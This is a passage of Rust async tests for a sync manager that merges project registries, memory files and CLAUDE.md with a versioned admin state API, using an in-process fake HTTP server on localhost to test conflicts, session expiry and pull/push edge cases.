            .iter()
            .map(|p| p["id"].as_str().unwrap())
            .collect();
        assert_eq!(ids, vec!["a", "c"]);
        assert!(filtered["deletedProjects"].get("b").is_none());
        assert!(filtered["deletedProjects"].get("d").is_some());
        assert_eq!(filtered["machineId"], "m1");
    }

    #[tokio::test]
    async fn push_memory_skipped_for_disabled_project() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        std::fs::create_dir_all(&store).unwrap();
        // Local projects.json maps repo → id "p-disabled".
        let projects_json = serde_json::json!({
            "projects": [{
                "id": "p-disabled",
                "name": "Disabled Project",
                "path": "/tmp/disabled",
                "gitRepo": "git@github.com:tc/disabled.git"
            }]
        });
        std::fs::write(
            store.join("projects.json"),
            serde_json::to_vec_pretty(&projects_json).unwrap(),
        )
        .unwrap();
        // workspace_state.json marks that id as sync-disabled.
        let ws_json = serde_json::json!({
            "openProjectIds": [],
            "tabOrder": [],
            "activeProjectId": null,
            "syncDisabledProjectIds": ["p-disabled"]
        });
        std::fs::write(
            store.join("workspace_state.json"),
            serde_json::to_vec_pretty(&ws_json).unwrap(),
        )
        .unwrap();

        let mgr = fake_manager_with_store(store);
        // Profile id required for memory keys.
        *mgr.profile_id.lock().await = Some("pid-1".to_string());

        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let key = "claude-memory:pid-1:git@github.com:tc/disabled.git";
        // Should silently no-op because the project is disabled — and since
        // we have no real server wired up, getting past the early-return
        // would otherwise hit the network and panic the test.
        mgr.push_memory(key, &push_state)
            .await
            .expect("push_memory should be a no-op for disabled project");

        // No hash recorded — confirms we exited before push_with_merge.
        let st = push_state.lock().await;
        assert!(
            !st.last_hash.contains_key(key),
            "no push should have been recorded for a disabled project"
        );
    }

    #[tokio::test]
    async fn pull_leaves_a_sync_disabled_record_alone() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![record("x", "mine", "C:\\code\\x")]);
        std::fs::write(
            store.join("workspace_state.json"),
            serde_json::to_vec(&json!({"syncDisabledProjectIds": ["x"]})).unwrap(),
        )
        .unwrap();
        let mgr = fake_manager_with_store(store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        // The server's copy is newer and even carries a delete.
        let mut theirs = record("x", "theirs", "/Users/alice/code/x");
        theirs["updatedAt"] = json!("2099-01-01T00:00:00Z");
        let remote = json!({
            "projects": [theirs],
            "deletedProjects": {"x": {"deletedAt": "2099-06-01T00:00:00Z"}}
        });
        mgr.apply_state("projects", &remote, &push_state)
            .await
            .unwrap();

        assert_eq!(record_on_disk(&store, "x")["name"], "mine");
        // Nothing syncable differs from the server, so nothing to push.
        assert!(push_state.lock().await.push_requests.is_empty());
    }

    #[tokio::test]
    async fn a_sync_disabled_record_never_folds_with_the_other_machines_record() {
        // Windows `mnemos` (sync disabled here) and the Mac's `tcbv2` are the
        // same repo. Folding them wrote `mac-r -> win-d`, the push sent that
        // tombstone without `win-d`, and the Mac dropped its own record.
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        let mut win = record("win-d", "mnemos", "C:\\code\\mnemos");
        win["createdAt"] = json!("2026-01-01T00:00:00Z");
        win["gitRepo"] = json!("acme/TCB");
        write_registry(&store, vec![win]);
        std::fs::write(
            store.join("workspace_state.json"),
            serde_json::to_vec(&json!({"syncDisabledProjectIds": ["win-d"]})).unwrap(),
        )
        .unwrap();
        let mgr = fake_manager_with_store(store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        let mut mac = record("mac-r", "tcbv2", "/Users/alice/code/tcbv2");
        mac["gitRepo"] = json!("acme/TCB");
        let remote = json!({ "projects": [mac] });
        mgr.apply_state("projects", &remote, &push_state)
            .await
            .unwrap();

        assert_eq!(disk_ids(&store), vec!["mac-r", "win-d"]);
        let disk: Value =
            serde_json::from_slice(&std::fs::read(store.join("projects.json")).unwrap()).unwrap();
        assert!(
            disk.get("deletedProjects")
                .and_then(Value::as_object)
                .is_none_or(|t| t.is_empty()),
            "no fold, so no handover tombstone: {disk}"
        );
        assert_eq!(record_on_disk(&store, "win-d")["path"], "C:\\code\\mnemos");
        assert!(record_on_disk(&store, "win-d").get("paths").is_none());
        // What is left for the server is exactly what it has.
        assert!(push_state.lock().await.push_requests.is_empty());
    }

    // ---- Projects: pull ----

    #[tokio::test]
    async fn pull_never_drops_a_local_only_record() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(
            &store,
            vec![
                record("shared", "Admin", "/Users/alice/code/Admin"),
                record("local-only", "Sprocket", "C:\\code\\Sprocket"),
            ],
        );
        let mgr = fake_manager_with_store(store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        // The server never heard of `local-only` (the old pull replaced the
        // file with this and erased it).
        let remote = json!({
            "projects": [
                record("shared", "Admin", "/Users/alice/code/Admin"),
                record("remote-only", "games", "/Users/alice/code/games")
            ],
            "machineId": "mac"
        });
        mgr.apply_state("projects", &remote, &push_state)
            .await
            .unwrap();

        assert_eq!(
            disk_ids(&store),
            vec!["local-only", "remote-only", "shared"]
        );
        let st = push_state.lock().await;
        // The server lacks `local-only`, so the pull asks for a push instead
        // of calling the file synced...
        assert!(st.push_requests.contains(&DebounceScope::Projects));
        assert!(st.projects_synced.is_none());
        // ...and never mutes projects.json for a time window.
        assert!(!st.is_suppressed(&store.join("projects.json")));
        drop(st);
        assert!(mgr.status_tx.borrow().projects_applied_at.is_some());
    }

    // ---- Projects over HTTP (in-process stand-in for the admin API) ----

    /// The admin `/api/tcb/state` endpoints reduced to a versioned key-value
    /// map with CAS, so tests drive the real push/pull code over HTTP.
    #[derive(Default)]
    struct FakeAdmin {
        states: BTreeMap<String, (Value, i64)>,
        requests: Vec<(String, String)>,
        puts: Vec<String>,
        /// Keys whose writes fail with a 500.
        failing: HashSet<String>,
        /// Keys written without `expected_version` (a blind write).
        lww: Vec<String>,
        /// Created by another machine right after a GET found them missing.
        appear_on_miss: BTreeMap<String, Value>,
        /// Keys another machine writes after every GET of them, so a CAS
        /// write of them never lands.
        moving: HashSet<String>,
        /// The blob store, path -> lastModified.
        blobs: BTreeMap<String, String>,
        /// Blob uploads answer 502 (a redeploy).
        blobs_down: bool,
        /// Every `/api/tcb/*` call answers 401, as for a revoked token.
        session_expired: bool,
        /// Status `POST /api/auth/refresh` answers with (with the admin
        /// backend's error body). `None`: the route does not exist.
        refresh_status: Option<&'static str>,
        /// The refresh is answered by a filtering proxy's HTML page instead
        /// of the admin backend, with `refresh_status`.
        refresh_block_page: bool,
        /// Team scope state, `(team id, key) -> (value, version)`.
        team_states: BTreeMap<(String, String), (Value, i64)>,
        /// Called once after the next GET of this key, e.g. to play another
        /// machine writing it right after this machine read it.
        after_get: Option<(String, AfterGet)>,
        /// The `X-Mnemos-Sync-Protocol` header of every request, in order.
        protocols: Vec<Option<String>>,
        /// `/api/tcb/*` requests below this protocol answer 426, as the
        /// admin backend does above `MNEMOS_SYNC_MIN_PROTOCOL`.
        min_protocol: Option<u32>,
        /// Asked at every blob upload; its answers are kept in `put_probes`.
        put_probe: Option<Box<dyn Fn() -> bool + Send>>,
        put_probes: Vec<bool>,
    }

    type AfterGet = Box<dyn FnOnce(&mut BTreeMap<String, (Value, i64)>) + Send>;

    type SharedAdmin = Arc<std::sync::Mutex<FakeAdmin>>;

    impl FakeAdmin {
        fn count(&self, method: &str, path: &str) -> usize {
            self.requests
                .iter()
                .filter(|(m, p)| m == method && p == path)
                .count()
        }
    }

    async fn fake_admin(admin: SharedAdmin) -> String {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((sock, _)) = listener.accept().await {
                let admin = admin.clone();
                tokio::spawn(async move {
                    let _ = serve_one(sock, admin).await;
                });
            }
        });
        format!("http://{addr}")
    }

    async fn serve_one(mut sock: tokio::net::TcpStream, admin: SharedAdmin) -> std::io::Result<()> {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let mut buf = Vec::new();
        let mut chunk = [0u8; 8192];
        let head_end = loop {
            let n = sock.read(&mut chunk).await?;
            if n == 0 {
                return Ok(());
            }
            buf.extend_from_slice(&chunk[..n]);
            if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                break i + 4;
            }
        };
        let head = String::from_utf8_lossy(&buf[..head_end]).into_owned();
        let len: usize = head
            .lines()
            .find_map(|l| {
                let (k, v) = l.split_once(':')?;
                k.trim()
                    .eq_ignore_ascii_case("content-length")
                    .then(|| v.trim().parse().ok())
                    .flatten()
            })
            .unwrap_or(0);
        while buf.len() < head_end + len {
            let n = sock.read(&mut chunk).await?;
            if n == 0 {
                break;
            }
            buf.extend_from_slice(&chunk[..n]);
        }
        let body: Value = serde_json::from_slice(&buf[head_end..]).unwrap_or(Value::Null);
        let mut first = head.lines().next().unwrap_or_default().split_whitespace();
        let method = first.next().unwrap_or_default().to_string();
        let path = first.next().unwrap_or_default().to_string();
        let protocol = head.lines().find_map(|l| {
            let (k, v) = l.split_once(':')?;
            k.trim()
                .eq_ignore_ascii_case(crate::protocol::SYNC_PROTOCOL_HEADER)
                .then(|| v.trim().to_string())
        });
        let refused_min = {
            let mut st = admin.lock().unwrap();
            st.protocols.push(protocol.clone());
            let version: u32 = protocol
                .as_deref()
                .and_then(|v| v.parse().ok())
                .unwrap_or(0);
            st.min_protocol
                .filter(|min| path.starts_with("/api/tcb") && version < *min)
        };
        let (status, reply) = match refused_min {
            Some(min) => {
                admin
                    .lock()
                    .unwrap()
                    .requests
                    .push((method.clone(), path.clone()));
                (
                    "426 Upgrade Required",
                    json!({"error": "update", "client_protocol": 0, "min_protocol": min, "server_protocol": min}),
                )
            }
            None => route(&admin, &method, &path, &body),
        };
        // A string reply goes out as raw HTML, the way a proxy's page would;
        // no admin route answers with a bare JSON string.
        let (content_type, bytes) = match reply {
            Value::String(page) => ("text/html", page.into_bytes()),
            other => ("application/json", serde_json::to_vec(&other).unwrap()),
        };
        let headers = format!(
            "HTTP/1.1 {status}\r\nContent-Type: {content_type}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
            bytes.len()
        );
        sock.write_all(headers.as_bytes()).await?;
        sock.write_all(&bytes).await?;
        sock.shutdown().await
    }

    /// The `synced_at` the fake admin reports for every key.
    const FAKE_SYNCED_AT: &str = "2026-09-24T00:00:00Z";

    fn state_json(key: &str, value: &Value, version: i64) -> Value {
        json!({"key": key, "value": value, "version": version, "synced_at": FAKE_SYNCED_AT})
    }

    fn route(admin: &SharedAdmin, method: &str, path: &str, body: &Value) -> (&'static str, Value) {
        let mut st = admin.lock().unwrap();
        st.requests.push((method.to_string(), path.to_string()));
        if (method, path) == ("POST", "/api/auth/refresh") {
            return match st.refresh_status {
                Some(status) if st.refresh_block_page => (
                    status,
                    Value::String("<html><body>Blocked by policy</body></html>".into()),
                ),
                Some(status) => (status, json!({"error": "Session not found or expired"})),
                None => ("404 Not Found", json!({})),
            };
        }
        if st.session_expired {
            return (
                "401 Unauthorized",
                json!({"error": "Invalid or expired token"}),
            );
        }
        match (method, path) {
            ("GET", "/api/tcb/state") => {
                let states: Vec<Value> = st
                    .states
                    .iter()
                    .map(|(k, (v, ver))| state_json(k, v, *ver))
                    .collect();
                ("200 OK", json!({ "states": states }))
            }
            ("POST", "/api/tcb/state") => {
                let key = body["key"].as_str().unwrap_or_default().to_string();
                if st.failing.contains(&key) {
                    return ("500 Internal Server Error", json!({}));
                }
                if body["expected_version"].is_null() {
                    st.lww.push(key.clone());
                }
                let current = st.states.get(&key).cloned();
                if let (Some(expected), Some((cur_value, cur_version))) =
                    (body["expected_version"].as_i64(), &current)
                {
                    if expected != *cur_version {
                        return (
                            "409 Conflict",
                            json!({"current_version": cur_version, "current_value": cur_value}),
                        );
                    }
                }
                let version = current.map_or(1, |(_, v)| v + 1);
                st.states
                    .insert(key.clone(), (body["value"].clone(), version));
                st.puts.push(key.clone());
                ("200 OK", state_json(&key, &body["value"], version))
            }
            ("GET", p) if p.starts_with("/api/tcb/state/") => {
                let key = p["/api/tcb/state/".len()..].to_string();
                let reply = match st.states.get(&key) {
                    Some((v, ver)) => ("200 OK", state_json(&key, v, *ver)),
                    None => ("404 Not Found", json!({})),
                };
                let st = &mut *st;
                match st.states.get_mut(&key) {
                    Some(current) if st.moving.contains(&key) => current.1 += 1,
                    Some(_) => {}
                    None => {
                        if let Some(v) = st.appear_on_miss.remove(&key) {
                            st.states.insert(key.clone(), (v, 1));
                        }
                    }
                }
                if st.after_get.as_ref().is_some_and(|(k, _)| *k == key) {
                    let (_, hook) = st.after_get.take().unwrap();
                    hook(&mut st.states);
                }
                reply
            }
            ("GET", p) if p.starts_with("/api/tcb/teams/") && p.ends_with("/state") => {
                let team = p["/api/tcb/teams/".len()..p.len() - "/state".len()].to_string();
                let states: Vec<Value> = st
                    .team_states
                    .iter()
                    .filter(|((t, _), _)| *t == team)
                    .map(|((_, k), (v, ver))| state_json(k, v, *ver))
                    .collect();
                ("200 OK", json!({ "states": states }))
            }
            ("POST", p) if p.starts_with("/api/tcb/teams/") && p.ends_with("/state") => {
                let team = p["/api/tcb/teams/".len()..p.len() - "/state".len()].to_string();
                let key = body["key"].as_str().unwrap_or_default().to_string();
                let slot = (team, key.clone());
                let version = st.team_states.get(&slot).map_or(1, |(_, v)| v + 1);
                st.team_states
                    .insert(slot, (body["value"].clone(), version));
                ("200 OK", state_json(&key, &body["value"], version))
            }
            ("GET", p) if p.starts_with("/api/tcb/blobs?") => {
                let prefix = p
                    .split_once("prefix=")
                    .map(|(_, q)| q.split('&').next().unwrap_or_default().replace("%2F", "/"))
                    .unwrap_or_default();
                let items: Vec<Value> = st
                    .blobs
                    .iter()
                    .filter(|(path, _)| path.starts_with(&prefix))
                    .map(|(path, lm)| json!({"path": path, "size": 1, "etag": "e", "lastModified": lm}))
                    .collect();
                ("200 OK", json!({ "items": items }))
            }
            ("DELETE", p) if p.starts_with("/api/tcb/state/") => {
                // The conditional delete's `?expected_version=` is not
                // checked here (the e2e tests' server does).
                let rest = &p["/api/tcb/state/".len()..];
                let key = rest.split('?').next().unwrap_or(rest).to_string();
                match st.states.remove(&key) {
                    Some(_) => ("200 OK", json!({"success": true, "key": key})),
                    None => ("404 Not Found", json!({})),
                }
            }
            ("PUT", p) if p.starts_with("/api/tcb/blobs/") => {
                if let Some(probe) = &st.put_probe {
                    let seen = probe();
                    st.put_probes.push(seen);
                }
                if st.blobs_down {
                    return ("502 Bad Gateway", json!({}));
                }
                let path = p["/api/tcb/blobs/".len()..].to_string();
                let lm = mnemos_ide_core::registry::format_timestamp(chrono::Utc::now());
                st.blobs.insert(path, lm);
                ("200 OK", json!({}))
            }
            _ => ("404 Not Found", json!({})),
        }
    }

    fn manager_for(base_url: &str, store: PathBuf) -> Arc<SyncManager> {
        let auth = AdminAuth {
            base_url: base_url.to_string(),
            tokens: Some(tokens()),
        };
        Arc::new(SyncManager::from_auth(auth).with_mnemos_store_dir(store))
    }

    #[tokio::test]
    async fn push_merges_remote_only_records_in() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(
            &store,
            vec![record("local-1", "mnemos", "C:\\code\\mnemos")],
        );
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "projects".into(),
            (
                json!({"projects": [record("remote-1", "Sprocket", "/Users/alice/code/Sprocket")]}),
                7,
            ),
        );
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.push_file_json("projects", &push_state).await.unwrap();

        // The server keeps its record and gains ours (the old local-wins
        // push replaced it with ours alone).
        let server = admin.lock().unwrap().states["projects"].clone();
        assert_eq!(ids_of(&server.0), vec!["local-1", "remote-1"]);
        assert_eq!(server.1, 8);
        assert_eq!(admin.lock().unwrap().puts.len(), 1);
        // The merged registry is folded back into the file right away.
        assert_eq!(disk_ids(&store), vec!["local-1", "remote-1"]);
        assert_eq!(push_state.lock().await.known_version["projects"], 8);

        // The watcher event for that write finds nothing new to send.
        let before = admin.lock().unwrap().requests.len();
        mgr.push_file_json("projects", &push_state).await.unwrap();
        assert_eq!(admin.lock().unwrap().requests.len(), before);
    }

    #[tokio::test]
    async fn pull_matching_the_server_is_not_pushed_back_but_a_later_edit_is() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(
            &store,
            vec![record("a", "Admin", "/Users/alice/code/Admin")],
        );
        let admin = SharedAdmin::default();
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        let remote = json!({"projects": [
            record("a", "Admin", "/Users/alice/code/Admin"),
            record("b", "TCB", "/Users/alice/code/tcbv2")
        ]});
        mgr.apply_state("projects", &remote, &push_state)
            .await
            .unwrap();
        assert_eq!(disk_ids(&store), vec!["a", "b"]);
        {
            let st = push_state.lock().await;
            assert!(st.projects_synced.is_some());
            assert!(st.push_requests.is_empty());
        }

        // The watcher event for the pull's own write reaches no server.
        mgr.push_file_json("projects", &push_state).await.unwrap();
        assert!(admin.lock().unwrap().requests.is_empty());

        // An edit landing right after the pull is pushed: suppression is by
        // content, not a time window.
        write_registry(
            &store,
            vec![
                record("a", "Admin", "/Users/alice/code/Admin"),
                record("b", "TCB", "/Users/alice/code/tcbv2"),
                record("c", "games", "C:\\code\\games"),
            ],
        );
        mgr.push_file_json("projects", &push_state).await.unwrap();
        assert_eq!(admin.lock().unwrap().puts, vec!["projects".to_string()]);
        let server = admin.lock().unwrap().states["projects"].0.clone();
        assert_eq!(ids_of(&server), vec!["a", "b", "c"]);
    }

    #[tokio::test]
    async fn a_server_record_the_store_respells_is_not_pushed_back() {
        // Same record, same instant, but the server spells `createdAt` with
        // an offset and has no `lastOpenedAt`. Storing it through `Project`
        // respells both; that alone must not count as something to push.
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(
            &store,
            vec![record("a", "Admin", "/Users/alice/code/Admin")],
        );
        let admin = SharedAdmin::default();
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        let remote = json!({"projects": [{
            "id": "a", "name": "Admin", "path": "/Users/alice/code/Admin",
            "createdAt": "2026-09-01T02:00:00+02:00"
        }]});
        mgr.apply_state("projects", &remote, &push_state)
            .await
            .unwrap();
        {
            let st = push_state.lock().await;
            assert!(st.push_requests.is_empty());
            assert!(st.projects_synced.is_some());
        }
        mgr.push_file_json("projects", &push_state).await.unwrap();
        assert!(admin.lock().unwrap().requests.is_empty());
    }

    #[tokio::test]
    async fn poll_applies_only_when_the_version_moved() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "projects".into(),
            (
                json!({"projects": [record("a", "Admin", "/Users/alice/code/Admin")]}),
                3,
            ),
        );
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.poll_projects(&push_state).await.unwrap();
        assert_eq!(disk_ids(&store), vec!["a"]);
        assert_eq!(push_state.lock().await.known_version["projects"], 3);

        // Same version: not applied again (the file is left as it is).
        write_registry(&store, vec![record("b", "TCB", "/Users/alice/code/tcbv2")]);
        mgr.poll_projects(&push_state).await.unwrap();
        assert_eq!(disk_ids(&store), vec!["b"]);

        // Another machine pushed: merged in, local `b` kept.
        admin.lock().unwrap().states.insert(
            "projects".into(),
            (
                json!({"projects": [
                    record("a", "Admin", "/Users/alice/code/Admin"),
                    record("c", "games", "/Users/alice/code/games")
                ]}),
                4,
            ),
        );
        mgr.poll_projects(&push_state).await.unwrap();
        assert_eq!(disk_ids(&store), vec!["a", "b", "c"]);
        assert_eq!(push_state.lock().await.known_version["projects"], 4);
        assert_eq!(
            admin
                .lock()
                .unwrap()
                .count("GET", "/api/tcb/state/projects"),
            3
        );
    }

    #[tokio::test]
    async fn a_later_pull_leaves_unchanged_and_pending_keys_alone() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        let admin = SharedAdmin::default();
        admin
            .lock()
            .unwrap()
            .states
            .insert("claude-md".into(), (json!("server v3"), 3));
        let auth = AdminAuth {
            base_url: fake_admin(admin.clone()).await,
            tokens: Some(tokens()),
        };
        let mgr = Arc::new(
            SyncManager::from_auth(auth)
                .with_mnemos_store_dir(store.clone())
                .with_claude_home(&home),
        );
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let claude_md = home.join(".claude").join("CLAUDE.md");
        let none = HashSet::new();

        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        assert_eq!(std::fs::read_to_string(&claude_md).unwrap(), "server v3");

        // The user edits the file; the push has not gone up yet (offline, or
        // still inside its debounce).
        std::fs::write(&claude_md, "local edit").unwrap();
        mgr.do_pull_all(&push_state, PullScope::Changes { pending: &none })
            .await
            .unwrap();
        assert_eq!(
            std::fs::read_to_string(&claude_md).unwrap(),
            "local edit",
            "an unchanged server version is not written over the file again"
        );

        admin
            .lock()
            .unwrap()
            .states
            .insert("claude-md".into(), (json!("server v4"), 4));
        let pending: HashSet<String> = ["claude-md".to_string()].into_iter().collect();
        mgr.do_pull_all(&push_state, PullScope::Changes { pending: &pending })
            .await
            .unwrap();
        assert_eq!(
            std::fs::read_to_string(&claude_md).unwrap(),
            "local edit",
            "a key with a local change waiting to be pushed is not applied"
        );

        mgr.do_pull_all(&push_state, PullScope::Changes { pending: &none })
            .await
            .unwrap();
        assert_eq!(std::fs::read_to_string(&claude_md).unwrap(), "server v4");
        assert_eq!(push_state.lock().await.known_version["claude-md"], 4);
    }

    #[test]
    fn pending_keys_cover_debounced_and_retrying_scopes() {
        let mut last_seen = HashMap::new();
        last_seen.insert(DebounceScope::GlobalFile("claude-md"), Instant::now());
        last_seen.insert(DebounceScope::Transcripts, Instant::now());
        let mut retry = HashMap::new();
        retry.insert(
            DebounceScope::Directory("claude-skills"),
            RetrySchedule::first(),
        );
        retry.insert(
            DebounceScope::Memory("claude-memory:p:o/r".into()),
            RetrySchedule::first(),
        );
        let mut keys: Vec<String> = pending_push_keys(&last_seen, &retry).into_iter().collect();
        keys.sort();
        assert_eq!(
            keys,
            vec!["claude-md", "claude-memory:p:o/r", "claude-skills"]
        );
    }

    #[tokio::test]
    async fn a_server_that_lost_pushed_records_gets_them_back() {
        // An older build on the Mac replaced the whole registry and dropped
        // `x`, which this machine pushed before. The merge still has `x`, and
        // so does the hash of the last push; the push must not be skipped.
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(
            &store,
            vec![
                record("a", "Admin", "/Users/alice/code/Admin"),
                record("x", "Sprocket", "C:\\code\\Sprocket"),
            ],
        );
        let admin = SharedAdmin::default();
        let old_build = json!({"projects": [record("a", "Admin", "/Users/alice/code/Admin")]});
        admin
            .lock()
            .unwrap()
            .states
            .insert("projects".into(), (old_build.clone(), 1));
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.push_file_json("projects", &push_state).await.unwrap();
        assert_eq!(
            ids_of(&admin.lock().unwrap().states["projects"].0),
            vec!["a", "x"]
        );

        // The old build writes its whole file back: the same value as before
        // this machine's push, so the merge (and its hash) match that push.
        admin
            .lock()
            .unwrap()
            .states
            .insert("projects".into(), (old_build, 3));
        // What the pull's push request leads to.
        push_state.lock().await.projects_synced = None;
        mgr.push_file_json("projects", &push_state).await.unwrap();
        assert_eq!(
            ids_of(&admin.lock().unwrap().states["projects"].0),
            vec!["a", "x"]
        );
    }

    #[tokio::test]
    async fn a_failed_apply_leaves_the_version_unknown() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        // A directory where `projects.json` should be: every apply fails.
        std::fs::remove_file(store.join("projects.json")).unwrap();
        std::fs::create_dir_all(store.join("projects.json")).unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "projects".into(),
            (
                json!({"projects": [record("a", "Admin", "/Users/alice/code/Admin")]}),
                5,
            ),
        );
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.poll_projects(&push_state).await.unwrap();
        assert!(
            !push_state
                .lock()
                .await
                .known_version
                .contains_key("projects"),
            "the next poll must try again"
        );

        std::fs::remove_dir(store.join("projects.json")).unwrap();
        mgr.poll_projects(&push_state).await.unwrap();
        assert_eq!(disk_ids(&store), vec!["a"]);
        assert_eq!(push_state.lock().await.known_version["projects"], 5);
    }

    #[tokio::test]
    async fn applying_memory_mutes_only_the_memory_files() {
        let mut st = PushState::default();
        let project_dir = PathBuf::from("/h/.claude/projects/-Users-h-code-x");
        st.suppress(project_dir.join("memory"));
        st.suppress(project_dir.join("MEMORY.md"));
        assert!(st.is_suppressed(&project_dir.join("memory").join("a.md")));
        assert!(st.is_suppressed(&project_dir.join("MEMORY.md")));
        assert!(!st.is_suppressed(&project_dir.join("0b6f3c1e-8a3b-4f7e-9d2a-1c2d3e4f5a6b.jsonl")));
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn running_manager_pulls_on_request_and_keeps_workspace_state_local() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        std::fs::create_dir_all(&home).unwrap();
        let store = tmp.path().join("store");
        write_registry(
            &store,
            vec![record("local-1", "mnemos", "C:\\code\\mnemos")],
        );
        let ws = json!({"openProjectIds": ["local-1"], "activeProjectId": "local-1", "tabOrder": ["local-1"]});
        std::fs::write(
            store.join("workspace_state.json"),
            serde_json::to_vec_pretty(&ws).unwrap(),
        )
        .unwrap();

        let admin = SharedAdmin::default();
        {
            let mut st = admin.lock().unwrap();
            st.states.insert(
                "projects".into(),
                (
                    json!({"projects": [record("remote-1", "Sprocket", "/Users/alice/code/Sprocket")]}),
                    1,
                ),
            );
            // An older build on the other machine still pushes its tabs.
            st.states.insert(
                MNEMOS_WORKSPACE_STATE_KEY.into(),
                (
                    json!({"openProjectIds": ["remote-1"], "tabOrder": ["remote-1"]}),
                    1,
                ),
            );
        }
        let auth = AdminAuth {
            base_url: fake_admin(admin.clone()).await,
            tokens: Some(tokens()),
        };
        let mgr = Arc::new(
            SyncManager::from_auth(auth)
                .with_mnemos_store_dir(store.clone())
                .with_claude_home(&home),
        );
        mgr.clone().start().await.unwrap();

        // Served by the event loop once the initial sync is done; the pull
        // that sync just ran is inside the floor, so no second pull yet.
        mgr.clone().pull_now().await.unwrap();
        assert_eq!(admin.lock().unwrap().count("GET", "/api/tcb/state"), 1);
        // What the app's first tab reconcile waits for.
        assert!(mgr.status_tx.borrow().first_pull_done);

        // Both machines' projects on both sides.
        assert_eq!(disk_ids(&store), vec!["local-1", "remote-1"]);
        let server = admin.lock().unwrap().states["projects"].0.clone();
        assert_eq!(ids_of(&server), vec!["local-1", "remote-1"]);
        // Tabs stay this machine's own, and are never pushed. (The store may
        // re-serialize the file when it saves the registry; the tabs in it
        // must be untouched.)
        let tabs: Value =
            serde_json::from_slice(&std::fs::read(store.join("workspace_state.json")).unwrap())
                .unwrap();
        for key in ["openProjectIds", "activeProjectId", "tabOrder"] {
            assert_eq!(tabs[key], ws[key], "{key}");
        }
        assert!(!admin
            .lock()
            .unwrap()
            .puts
            .iter()
            .any(|k| k == MNEMOS_WORKSPACE_STATE_KEY));

        // The startup transcript pull lists the blob store once (empty).
        let listings = || {
            admin
                .lock()
                .unwrap()
                .requests
                .iter()
                .filter(|(m, p)| m == "GET" && p.starts_with("/api/tcb/blobs?"))
                .count()
        };
        let wait_for = |n: usize| async move {
            for _ in 0..200 {
                if listings() >= n {
                    return;
                }
                tokio::time::sleep(std::time::Duration::from_millis(25)).await;
            }
            panic!("expected {n} blob listings, saw {}", listings());
        };
        wait_for(1).await;

        // Past the floor, pull_now pulls again through the same loop, and
        // takes a full transcript pull with it.
        mgr.status_tx
            .send_modify(|s| s.last_pull_at = Some(UNIX_EPOCH));
        mgr.clone().pull_now().await.unwrap();
        assert_eq!(admin.lock().unwrap().count("GET", "/api/tcb/state"), 2);
        wait_for(2).await;

        mgr.stop().await.unwrap();
    }

    // ---- Claude session index ----

    const SID: &str = "0b6f3c1e-8a3b-4f7e-9d2a-1c2d3e4f5a6b";

    /// Transcript sync over `mgr`'s client, with its state in `store` and
    /// its registry files there too (never Mnemos's real ones).
    fn test_transcripts(mgr: &SyncManager, store: &Path, tmp: &Path) -> TranscriptSync {
        TranscriptSync::new(
            (*mgr.client).clone(),
            store.to_path_buf(),
            tmp.join("claude-projects"),
        )
        .with_registry_files(
            store.join("projects.json"),
            store.join("workspace_state.json"),
        )
    }

    fn index_entry(machine: &str, seq: u64, at: &str) -> Value {
        json!({ SID: { machine: {"seq": seq, "at": at} } })
    }

    #[tokio::test]
    async fn the_session_index_is_state_not_a_file_and_never_goes_to_the_team() {
        assert!(!SHAREABLE_TEAM_KEYS.contains(&SESSION_INDEX_KEY));
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        std::fs::create_dir_all(&home).unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        let admin = SharedAdmin::default();
        let auth = AdminAuth {
            base_url: fake_admin(admin.clone()).await,
            tokens: Some(tokens()),
        };
        let mgr = Arc::new(
            SyncManager::from_auth(auth)
                .with_mnemos_store_dir(store.clone())
                .with_claude_home(&home),
